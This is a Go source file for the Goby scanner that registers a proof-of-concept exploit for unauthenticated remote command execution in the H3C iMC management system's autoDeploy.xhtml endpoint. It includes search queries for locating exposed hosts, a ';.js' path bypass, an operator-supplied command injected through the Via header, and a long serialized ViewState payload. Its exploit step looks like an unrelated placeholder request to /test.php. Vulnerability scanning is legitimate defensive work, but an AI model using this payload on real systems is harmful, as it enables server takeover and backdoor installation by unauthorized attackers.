package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "H3C iMC Intelligent Management Center System /imc/autoDeploy.xhtml Command Execution Vulnerability",
    "Description": "<p>H3C IMC (Intelligent Management Center) is a next-generation business intelligent management product launched by H3C. It integrates multiple products and provides unified management, control, and monitoring functions related to networks. A remote code execution vulnerability exists in the autoDeploy.xhtml interface of the H3C IMC Intelligent Management Center system. Unauthenticated attackers can exploit this vulnerability to execute arbitrary code on the server, implant backdoors, gain server permissions, and ultimately control the entire web server.</p>",
    "Product": "H3C-iMC",
    "Homepage": "https://www.h3c.com/cn/",
    "DisclosureDate": "2024-12-04",
    "PostTime": "2024-12-04",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "(title=\"用户自助服务\" && body=\"/selfservice/javax.faces.resource/\") || body=\"/selfservice/index.xhtml\"",
    "GobyQuery": "(title=\"用户自助服务\" && body=\"/selfservice/javax.faces.resource/\") || body=\"/selfservice/index.xhtml\"",
    "Level": "3",
    "Impact": "<p>A remote code execution vulnerability exists in the autoDeploy.xhtml interface of the H3C IMC Intelligent Management Center system. Unauthenticated attackers can exploit this vulnerability to execute arbitrary code on the server, implant backdoors, gain server permissions, and ultimately control the entire web server.</p>",
    "Recommendation": "<p>1. Avoid executing external commands whenever possible.</p><p>2. Use custom functions or libraries to replace the functionality of external commands.</p><p>3. Update to the latest patched version provided by the vendor. For details, refer to: <a href=\"https://www.h3c.com/cn/\">https://www.h3c.com/cn/</a></p>",
    "References": [
        "https://blog.csdn.net/weixin_48539059/article/details/141135315?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/imc/autoDeploy.xhtml;.js",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Via": "{{{COMMAND}}}"
                },
                "data_type": "text",
                "data": "javax.faces.ViewState=8SzWaaoxnkq9php028NtXbT98DEcA...Uh57HB/L8xz6eq%2b4sy0rUOuOdM5ccd2J6LPx8c6%2b53QkrX...jpFKgVnp07bad4n6CCBW8l98QIKwByAhLYdU2VpB/voaa....2oU%2burahQDFE8mIaFvmwyKOHiwyovIHCVymqKwNdWXm3iHLhYEQXL4....k3z7MWm%2bwbV2Dc9TXV4rs8E6M7ZvVM3B0pORK8vAhd2iLBkgFhGHw9ZgOwifGnyMzfxlU....gG4chEOg57teuLurMPrulbEVBAEl7rRwobqvxb91sG%2bGMrGWFL5%2bwFvE56x7UEzHtE/o0IRtzTKi/EFnamrPT1046e7L8jABKDB/LjCX2qAOmqQkIz4gXrEFnHHYZ9LZc7t9ZZPNT...JZjummuZuror/zwPbnsApwXlYsn2hDAZ7QlOBunA3t7omeOTI5keWXvmOH8eoEEN//SlmQblwhBZ7kSHPvStq0ZciiPptEzVjQ/k/gU2QbCSc7yG0MFbhcJEDQj4yKyJ/yTnOOma....KuNzZl%2bPpEua%2b28h2YCKipVb5S/wOCrg%2bKD3DUFCbdWHQRqDaZyvYsc8C0X7fzutiVUlSB7OdGoCjub9WuW0d2eeDWZmOt3Wunms3SwAbE7R%2bonCRVS8tiYWF8qiQS%2bl0k8Gw/Hz6Njpfe0upLIAtPFNDuSf69qGg4isEmY2FtoSQTdD8vU0BdJatHrBArPgo9Qsp0jSJBlUz2OqteQg05PYO6gEBXVj/RiTBHI1/pOzlcE0wVZcLUHnxGNvckSCTiT....nWbkWGJ8AYCvrM0PHZ/BYcKKRf3rMHoIqcAN%2bORMhXcmAXRcvq29c5xqoOuvrMSJPDZmbZhcm/99crGJSO5HxXQder9WKm2tVBaDLEC9ulpWyICJYgfxayoWkt6vwPcq2Tn20vn5RDpfqJKLNLbrV8g7JDRUUyW%2b....R6PRNunKhfJHvHcXAZ73mkCUf7cMUbNhqCbLSGP/D%2bqpqWXk5ZWjsT4tQ9tFH9uvPIaNB7FlcFXI2I2A9oPoY0ltif%2bb8BdPXVfpuZq8boHE4hY%2b33BIl%2bIa%2bov6nyMmGIzCKYeRbfDJtk/45EXvink6BIgA/205la6vvqKTGQ32o1AtepBgKei....604cVvbEP7UKor09Gz61mryE4D%2biXG1prZGCT3LEtdASuCkmf4RTEc5wks2In3ElZSZl8zf3RsHA0dgbvrpnXe2wLPI%2bUCAGO%2biOG9/%2bbCQJQNFmykkyRbmslfcilUxZ%2bIg%2bQuOs9FlMod2ICrkktOFFeZWNeznx737S8H4Nf2%2bp2QNHY2I6GFGtWpqjeZ%2bGmb1euM5Tzi06eJ.......koPrjkDT9VPoxCgpRMQl06x7NShkos7BCI9fV1%2b17t5gWZvqAYzeQUsZLaiBXaZfuUtPuBmbq1re/dB/VgSOn4QX%2b8AwwDjtfazsHw4aIdh4e2a1y/Ou2ZiI//EzkwIBksY6CluuPgocdvtOfNiWcXsfYs3UKLmL/48A4Ls0OF1TrQK4UnfCYt.....1DGrwzfXnM9vLHznFaJenqvLY3yTiKN5SSVxvGwvhmp6PFW4Jj7G8NXdr/zN7HyC9Eg1Y1jKP7uiO%2bGM2U/etvMOCKwnfP2MnbznP378fZHf1H9yiVVrn%2bm%2b0u8PV.....2MsOTgS6B7C8ItflgSfJz5dkJ8IssRAcY%2bu/2QjrW95BBMSRPu2EaCUm1IpuszXEwHYgDizWPzDB0hSRgCEjncpGhPX3i10bK4/snBaBcAxAa1e2er2LDe/4WgaIwc9w2wKn3wXY5B87BKF5/Xq30....NNf6EMRrQ9154rEkCJb4IU4sFsTuyYlfZatlV%2bC2HM7u7FEbdVvr6yYK4oQqvfPmF5yRplwAYUQAvr1jwLbGYxhGaTy14UUrtvoyph5Sqebk2YTKjKX4U7xX5ha4YbyoVIMSRzdvB6YXDY3BId%2bgmMWZtTf2UE%2b9UAx/7g30pQNXA....FP1adq6ySd4x3dGVCe4YJcYe2gKWYVcWj5XPwUSt2fxdshzgFnjjqmRgxowH2u2nZU0xG539lnxIOlB"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "RESULT1|lastbody|regex|([\\s\\S]*)",
                "RESULT2|RESULT1|regex|(\\s+)",
                "RESULT|RESULT1|replace_str|{{{RESULT2}}}|"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "H3C iMC智能管理中心系统 /imc/autoDeploy.xhtml 命令执行漏洞",
            "Product": "H3C-iMC",
            "Description": "<p>H3C IMC (Intelligent Management Center)智能管理中心是H3C推出的下一代业务智能管理产品。它融合了多个产品，以统一风格提供与网络相关的管理、控制、监控等功能。H3C IMC智能管理中心系统 autoDeploy.xhtml 接口存在远程代码执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>1. 尽量避免执行外部命令。</p><p>2. 使用自定义函数或函数库代替外部命令的功能。</p><p>3. 及时更新至厂商发布的最新修复版本，详情请参考：<a href=\"https://www.h3c.com/cn/\">https://www.h3c.com/cn/</a></p>",
            "Impact": "<p>H3C IMC智能管理中心系统 autoDeploy.xhtml 接口存在远程代码执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "H3C iMC Intelligent Management Center System /imc/autoDeploy.xhtml Command Execution Vulnerability",
            "Product": "H3C-iMC",
            "Description": "<p>H3C IMC (Intelligent Management Center) is a next-generation business intelligent management product launched by H3C. It integrates multiple products and provides unified management, control, and monitoring functions related to networks. A remote code execution vulnerability exists in the autoDeploy.xhtml interface of the H3C IMC Intelligent Management Center system. Unauthenticated attackers can exploit this vulnerability to execute arbitrary code on the server, implant backdoors, gain server permissions, and ultimately control the entire web server.</p>",
            "Recommendation": "<p>1. Avoid executing external commands whenever possible.</p><p>2. Use custom functions or libraries to replace the functionality of external commands.</p><p>3. Update to the latest patched version provided by the vendor. For details, refer to: <a href=\"https://www.h3c.com/cn/\">https://www.h3c.com/cn/</a></p>",
            "Impact": "<p>A remote code execution vulnerability exists in the autoDeploy.xhtml interface of the H3C IMC Intelligent Management Center system. Unauthenticated attackers can exploit this vulnerability to execute arbitrary code on the server, implant backdoors, gain server permissions, and ultimately control the entire web server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecEcho",
        "VUL_URL": "define|variable|/imc/autoDeploy.xhtml;.js"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }